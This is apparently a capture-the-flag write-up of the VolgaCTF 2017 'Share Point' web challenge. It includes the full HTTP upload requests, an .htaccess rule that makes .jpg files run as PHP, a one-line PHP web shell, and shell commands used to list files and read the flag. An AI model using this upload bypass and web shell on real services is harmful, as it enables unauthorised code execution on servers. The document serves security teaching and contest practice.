# Share Point - web 200

Author: [@mjdubell](https://twitter.com/mjdubell)

```
Share Point

Look! I wrote a good service for sharing your files with your friends, enjoy)
share-point.quals.2017.volgactf.ru
```


The challenge begun by signing in to the control panel by simply entering random account details. Once logged in you had the ability to upload files and share them with an other user. Since the site only had one functionality, uploading files, I assumed the goal had to be to upload a web shell and find the flag on the file system.

Uploading files with a `.php` extension got rejected. I tried some tricks when trying to upload my `shell.php`:

* Chaning the Content Type to `image/jpeg`.
* Injecting null values in the filename `shell.php\00.gif`.
* Uploading a file with the magic headers of a gif file.

Next I tried to upload an `.htaccess` file with the following contents `AddType application/x-httpd-php .jpg`, this would cause `.jpg` files to executed as `.php` files, and it worked!

The following code snippet shows the HTTP POST request from Burp Suite when uploading the `.htaccess` file and the following `shell.php.jpg`. 
```
POST /upload.php HTTP/1.1
Host: share-point.quals.2017.volgactf.ru
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Referer: http://share-point.quals.2017.volgactf.ru/upload.php
Content-Length: 271
Content-Type: multipart/form-data; boundary=---------------------------1620217569904038223723611436
Cookie: PHPSESSID=gsl3b673of0kbvaav8am0vs690
Connection: close

-----------------------------1620217569904038223723611436
Content-Disposition: form-data; name="userFile"; filename=".htaccess"
Content-Type: application/octet-stream

AddType application/x-httpd-php .jpg

-----------------------------1620217569904038223723611436--
```


```
POST /upload.php HTTP/1.1
Host: share-point.quals.2017.volgactf.ru
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Referer: http://share-point.quals.2017.volgactf.ru/upload.php
Content-Length: 256
Content-Type: multipart/form-data; boundary=---------------------------5375118911646132755521388984
Cookie: PHPSESSID=gsl3b673of0kbvaav8am0vs690
Connection: close

-----------------------------5375118911646132755521388984
Content-Disposition: form-data; name="userFile"; filename="shell.php.jpg"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>

-----------------------------5375118911646132755521388984--
```

Once we have uploaded the shell, we can start looking for the flag on the file system.

```
http://share-point.quals.2017.volgactf.ru/files/Smacker1/shell.php.jpg?cmd=ls -lah

total 24K
drwxr-xr-x   2 www-data www-data 4.0K Mar 27 00:05 .
drwxr-xr-x 252 www-data www-data  12K Mar 27 00:04 ..
-rw-r--r--   1 www-data www-data   37 Mar 27 00:04 .htaccess
-rw-r--r--   1 www-data www-data   31 Mar 27 00:05 shell.php.jpg
```

By pure luck I checked the `/opt/` folder and found `flag.txt`. Otherwise I would have simply searched for "flag".

```
http://share-point.quals.2017.volgactf.ru/files/shell.php.jpg?cmd=cat /opt/flag.txt
VolgaCTF{AnoTHer_apPro0Ach_to_file_Upl0Ad_with_PhP}
```


